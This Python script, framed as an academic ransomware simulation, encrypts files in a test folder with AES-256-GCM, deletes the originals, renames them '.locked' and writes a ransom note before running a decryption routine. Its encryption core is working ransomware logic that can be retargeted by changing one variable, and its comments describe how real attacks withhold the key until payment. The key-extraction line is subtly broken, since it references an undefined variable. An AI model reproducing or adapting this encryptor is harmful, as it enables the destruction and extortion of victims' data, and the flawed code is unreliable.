import os
import sys
import binascii
from typing import List, Tuple
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Hash import SHA256

# --- Configuration for Safety and Education ---
# WARNING: This directory must be created before running the script.
# The script will ONLY target files within this specific, safe location.
TARGET_DIR = "test_files_for_simulation"
ENCRYPTED_EXT = ".locked"
KEY_SIZE = 32  # 256 bits for AES-256
NONCE_LENGTH = 16 # AES GCM Nonce length

# --- Utility Functions ---

def create_safe_environment():
    """Creates the safe directory and some dummy files for encryption."""
    if not os.path.exists(TARGET_DIR):
        os.makedirs(TARGET_DIR)
        print(f"[SETUP] Created safe testing directory: '{TARGET_DIR}'")
    
    files_to_create = [
        "document.txt",
        "image.jpg",
        "config.ini",
        "secret_data.csv"
    ]

    for filename in files_to_create:
        filepath = os.path.join(TARGET_DIR, filename)
        if not os.path.exists(filepath):
            with open(filepath, 'w') as f:
                f.write(f"This is the original content of {filename}. If you see this after running the script, the file was not encrypted.")
            print(f"[SETUP] Created test file: {filename}")
    print("-" * 50)


def generate_key_and_nonce() -> Tuple[bytes, bytes]:
    """Generates a random AES-256 key and a nonce for the 'Decryption Tool'."""
    key = get_random_bytes(KEY_SIZE)
    # Note: In real ransomware, the session key would be encrypted with a public RSA key (asymmetric) 
    # before being written, but we keep it simple for this academic example.
    nonce = get_random_bytes(NONCE_LENGTH)
    return key, nonce

def write_ransom_note(key: bytes):
    """Creates a purely academic ransom note file."""
    note_path = os.path.join(TARGET_DIR, "RANSOM_NOTE.txt")
    
    academic_key_hex = binascii.hexlify(key).decode()
    
    note_content = f"""
    ========================================================
    | ACADEMIC RANSOM NOTE (SIMULATION ONLY)               |
    ========================================================
    
    Your files in the '{TARGET_DIR}' folder have been encrypted!
    
    -- TECHNICAL DETAILS (For Computer Science Study) --
    
    1. Algorithm: AES-256 in GCM (Galois/Counter Mode).
    2. Key Length: 256 bits (32 bytes).
    3. Encryption Status: Files are now renamed with '{ENCRYPTED_EXT}'.
    
    To decrypt your files in this simulation, you need the secret key.
    
    The Decryption Key is: 
    {academic_key_hex}
    
    *** In a real attack, this key would be securely transmitted ***
    *** and only provided after a payment.                     ***
    
    Run the 'main_decrypt_simulation' function with this key to restore your files.
    
    ========================================================
    """
    with open(note_path, 'w') as f:
        f.write(note_content.strip())
    
    print(f"[NOTE] Wrote academic ransom note to: {note_path}")


# --- Core Cryptographic Functions ---

def encrypt_file(filepath: str, key: bytes):
    """Encrypts a file's content using AES-256 GCM."""
    try:
        with open(filepath, 'rb') as f:
            plaintext = f.read()
            
        # 1. Create Cipher object (Nonce is generated internally)
        cipher = AES.new(key, AES.MODE_GCM)
        
        # 2. Encrypt and digest (get ciphertext and authentication tag)
        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
        nonce = cipher.nonce
        
        # 3. Write data back (Nonce + Tag + Ciphertext)
        encrypted_data = nonce + tag + ciphertext
        
        new_filepath = filepath + ENCRYPTED_EXT
        with open(new_filepath, 'wb') as f:
            f.write(encrypted_data)
        
        os.remove(filepath)
        print(f"  [ENCRYPTED] -> {new_filepath}")

    except Exception as e:
        print(f"  [ERROR] Failed to encrypt {filepath}: {e}")

def decrypt_file(filepath: str, key: bytes):
    """Decrypts a file's content using AES-256 GCM and verifies the tag."""
    if not filepath.endswith(ENCRYPTED_EXT):
        print(f"  [SKIP] {filepath} is not an encrypted file.")
        return

    try:
        with open(filepath, 'rb') as f:
            encrypted_data = f.read()
        
        # 1. Extract components (Nonce=16, Tag=16)
        nonce = encrypted_data[:16]
        tag = encrypted_data[16:32]
        ciphertext = encrypted_data[32:]
        
        # 2. Recreate Cipher object
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        
        # 3. Decrypt and verify (throws ValueError if tag verification fails)
        decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
        
        # 4. Write data back
        original_filepath = filepath[:-len(ENCRYPTED_EXT)]
        with open(original_filepath, 'wb') as f:
            f.write(decrypted_data)
        
        os.remove(filepath)
        print(f"  [DECRYPTED] -> {original_filepath}")

    except ValueError:
        print(f"  [FAILED] Decryption failed for {filepath}. Key or file is corrupted/tampered.")
    except Exception as e:
        print(f"  [ERROR] Failed to decrypt {filepath}: {e}")

# --- Simulation Main Loops ---

def main_encrypt_simulation():
    """Simulates the file encryption phase of ransomware."""
    print("Starting ENCRYPTION Simulation...")
    
    # 1. Generate the master key (this is the key the attacker holds)
    master_key, _ = generate_key_and_nonce()
    write_ransom_note(master_key)

    files_to_encrypt = [
        os.path.join(TARGET_DIR, f)
        for f in os.listdir(TARGET_DIR)
        if not f.endswith(ENCRYPTED_EXT) and f != "RANSOM_NOTE.txt"
    ]
    
    for filepath in files_to_encrypt:
        encrypt_file(filepath, master_key)
        
    print("\nENCRYPTION COMPLETE. Check the files in the directory.")
    print("To restore files, copy the key from 'RANSOM_NOTE.txt' and run 'main_decrypt_simulation()'.")
    return master_key


def main_decrypt_simulation(key_hex: str):
    """Simulates the file decryption phase using the key."""
    print("Starting DECRYPTION Simulation...")
    try:
        key = binascii.unhexlify(key_hex)
        if len(key) != KEY_SIZE:
             raise ValueError("Key length mismatch.")
    except Exception:
        print("\n[ERROR] Invalid key format or length. Cannot proceed with decryption.")
        return

    files_to_decrypt = [
        os.path.join(TARGET_DIR, f)
        for f in os.listdir(TARGET_DIR)
        if f.endswith(ENCRYPTED_EXT)
    ]

    if not files_to_decrypt:
        print("No encrypted files found in the directory.")
        return

    for filepath in files_to_decrypt:
        decrypt_file(filepath, key)
        
    print("\nDECRYPTION COMPLETE. Files restored to original names.")


if __name__ == "__main__":
    # --- Check for PyCryptodome dependency ---
    try:
        from Cryptodome.Cipher import AES
    except ImportError:
        print("Error: PyCryptodome library is not installed.")
        print("Please install it using: pip install pycryptodome")
        sys.exit(1)

    print("############################################################")
    print("# ACADEMIC RANSOMWARE SIMULATION")
    print("# This script uses AES-256 GCM to demonstrate encryption.")
    print("# Target files ONLY inside the 'test_files_for_simulation' folder.")
    print("############################################################\n")
    
    create_safe_environment()
    
    # --- PHASE 1: ENCRYPTION ---
    # The script acts as the malware, encrypting the files and leaving the key (in the note).
    master_key = main_encrypt_simulation()
    
    print("\n--- Next Step: DECIPHERING THE NOTE ---")
    print("Imagine you paid the ransom and received the key...")
    
    # In a real scenario, the user would manually copy the key from the note.
    # For this simulation, we'll read it back automatically:
    try:
        with open(os.path.join(TARGET_DIR, "RANSOM_NOTE.txt"), 'r') as f:
            note_content = f.read()
            # Simple extraction of the key from the note (look for the hex string)
            key_line = [line.strip() for line in note_content.split('\n') if len(line.strip()) == KEY_SIZE * 2 and all(c in '0123456789abcdef' for c in c)]
            
            if key_line:
                recovered_key_hex = key_line[0]
                print(f"Key recovered from Note (Hex): {recovered_key_hex}")
                
                # --- PHASE 2: DECRYPTION ---
                # The script acts as the decryption tool, using the key to restore files.
                main_decrypt_simulation(recovered_key_hex)
            else:
                print("Could not automatically recover key from note for decryption phase.")
    except FileNotFoundError:
        print("[ERROR] RANSOM_NOTE.txt not found.")